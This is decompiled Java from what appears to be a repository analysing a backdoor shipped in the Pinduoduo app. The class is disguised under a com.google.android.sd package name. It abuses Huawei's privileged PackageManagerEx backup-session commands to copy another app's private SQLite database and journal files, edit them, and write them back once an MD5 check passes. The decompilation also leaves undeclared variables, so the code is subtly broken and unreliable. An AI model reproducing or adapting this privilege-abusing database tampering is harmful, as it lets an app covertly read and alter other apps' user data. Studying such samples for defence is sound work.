package com.google.android.sd.biz_dynamic_dex.hw_db_handler;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Build;
import android.os.IBackupSessionCallback;
import android.os.RemoteException;
import android.text.TextUtils;
import com.google.android.sd.utils.IoUtils;
import com.huawei.android.app.PackageManagerEx;
import java.io.Closeable;
import java.io.File;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import org.json.JSONObject;

public class HwDBHandler {
  private static final String JOURNAL_MODE_WAL = "wal";
  
  private boolean copyDBSuc;
  
  private boolean copyShmSuc;
  
  private boolean copyWalSuc;
  
  SQLiteDatabase database;
  
  private final String dbName;
  
  private boolean isWalDB;
  
  private String originMd5;
  
  private final String originPath;
  
  private final String tempPath;
  
  private boolean writeDBSuc;
  
  private boolean writeShmSuc;
  
  private boolean writeWalSuc;
  
  public HwDBHandler(Context paramContext, String paramString1, String paramString2, String paramString3) {
    this.originPath = paramString1;
    this.tempPath = paramString2;
    this.dbName = paramString3;
    boolean bool = copyFile(paramContext, getOriginDBPath(), paramString2);
    this.copyDBSuc = bool;
    if (!bool)
      return; 
    this.originMd5 = IoUtils.calFileMd5(getTempDBPath());
    if (Build.VERSION.SDK_INT >= 27)
      this.database = SQLiteDatabase.openDatabase(getTempDBPath(), null, 0); 
    SQLiteDatabase sQLiteDatabase = this.database;
    if (sQLiteDatabase != null) {
      bool = isWalDb(sQLiteDatabase);
      this.isWalDB = bool;
      if (bool) {
        this.copyWalSuc = copyFile(paramContext, getOriginWalPath(), paramString2);
        this.copyShmSuc = copyFile(paramContext, getOriginShmPath(), paramString2);
      } 
    } 
  }
  
  private boolean checkMd5(Context paramContext) {
    if (TextUtils.isEmpty(this.originMd5))
      return false; 
    String str2 = getOriginDBPath();
    StringBuilder stringBuilder2 = new StringBuilder();
    stringBuilder2.append(this.tempPath);
    stringBuilder2.append("/tmp");
    if (!copyFile(paramContext, str2, stringBuilder2.toString()))
      return false; 
    StringBuilder stringBuilder1 = new StringBuilder();
    stringBuilder1.append(this.tempPath);
    stringBuilder1.append("/tmp/");
    stringBuilder1.append(this.dbName);
    String str1 = IoUtils.calFileMd5(stringBuilder1.toString());
    return TextUtils.equals(this.originMd5, str1);
  }
  
  private static boolean copyFile(Context paramContext, String paramString1, String paramString2) {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("backup file ");
    stringBuilder.append(paramString1);
    stringBuilder.append(" ");
    stringBuilder.append(paramString2);
    paramString1 = stringBuilder.toString();
    final CountDownLatch latch = new CountDownLatch(1);
    final boolean[] res = new boolean[1];
    execCmd(paramString1, new IBackupSessionCallback.Stub() {
          public void onTaskStatusChanged(int param1Int1, int param1Int2, int param1Int3, String param1String) throws RemoteException {
            if (param1Int3 == 0) {
              res[0] = true;
              latch.countDown();
              return;
            } 
            if (param1Int3 < 0) {
              res[0] = false;
              latch.countDown();
            } 
          }
        });
    try {
      countDownLatch.await(2L, TimeUnit.SECONDS);
    } finally {}
    return arrayOfBoolean[0];
  }
  
  private static int execCmd(String paramString, IBackupSessionCallback.Stub paramStub) {
    try {
      int i = PackageManagerEx.startBackupSession((IBackupSessionCallback)paramStub);
      return (i != -1) ? ((i == -2) ? -1 : PackageManagerEx.executeBackupTask(i, paramString)) : -1;
    } catch (Exception exception) {
      return -1;
    } 
  }
  
  private String getOriginDBPath() {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append(this.originPath);
    stringBuilder.append("/");
    stringBuilder.append(this.dbName);
    return stringBuilder.toString();
  }
  
  private String getOriginShmPath() {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append(this.originPath);
    stringBuilder.append("/");
    stringBuilder.append(this.dbName);
    stringBuilder.append("-shm");
    return stringBuilder.toString();
  }
  
  private String getOriginWalPath() {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append(this.originPath);
    stringBuilder.append("/");
    stringBuilder.append(this.dbName);
    stringBuilder.append("-wal");
    return stringBuilder.toString();
  }
  
  private String getTempDBPath() {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append(this.tempPath);
    stringBuilder.append("/");
    stringBuilder.append(this.dbName);
    return stringBuilder.toString();
  }
  
  private String getTempShmPath() {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append(this.tempPath);
    stringBuilder.append("/");
    stringBuilder.append(this.dbName);
    stringBuilder.append("-shm");
    return stringBuilder.toString();
  }
  
  private String getTempWalPath() {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append(this.tempPath);
    stringBuilder.append("/");
    stringBuilder.append(this.dbName);
    stringBuilder.append("-wal");
    return stringBuilder.toString();
  }
  
  private static boolean isWalDb(SQLiteDatabase paramSQLiteDatabase) {
    Cursor cursor2 = null;
    Cursor cursor1 = null;
    try {
      Cursor cursor = paramSQLiteDatabase.rawQuery("pragma journal_mode;", null);
      cursor1 = cursor;
      cursor2 = cursor;
      cursor.moveToNext();
      cursor1 = cursor;
      cursor2 = cursor;
      return "wal".equals(cursor.getString(0));
    } catch (Exception exception) {
      return false;
    } finally {
      IoUtils.closeQuietly((Closeable)cursor1);
    } 
  }
  
  public void clear() {
    IoUtils.deleteRecycle(new File(getTempDBPath()));
    if (this.isWalDB) {
      IoUtils.deleteRecycle(new File(getTempShmPath()));
      IoUtils.deleteRecycle(new File(getTempWalPath()));
    } 
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append(this.tempPath);
    stringBuilder.append("/tmp");
    IoUtils.deleteRecycle(new File(stringBuilder.toString()));
  }
  
  public SQLiteDatabase getDb() {
    return this.database;
  }
  
  public JSONObject getOperateInfo() {
    JSONObject jSONObject = new JSONObject();
    try {
      jSONObject.put("copy_db", this.copyDBSuc);
      jSONObject.put("write_db", this.writeDBSuc);
      if (this.isWalDB) {
        jSONObject.put("copy_wal", this.copyWalSuc);
        jSONObject.put("copy_shm", this.copyShmSuc);
        jSONObject.put("write_wal", this.writeWalSuc);
        jSONObject.put("write_shm", this.writeShmSuc);
      } 
      return jSONObject;
    } catch (Exception exception) {
      return jSONObject;
    } 
  }
  
  public boolean write(Context paramContext) {
    if (checkMd5(paramContext)) {
      this.writeDBSuc = copyFile(paramContext, getTempDBPath(), this.originPath);
      if (this.isWalDB) {
        this.writeShmSuc = copyFile(paramContext, getTempShmPath(), this.originPath);
        this.writeWalSuc = copyFile(paramContext, getTempWalPath(), this.originPath);
      } 
      return this.writeDBSuc;
    } 
    return false;
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\7c6e6702-e461-4315-8631-eee246aeba95-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\hw_db_handler\HwDBHandler.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */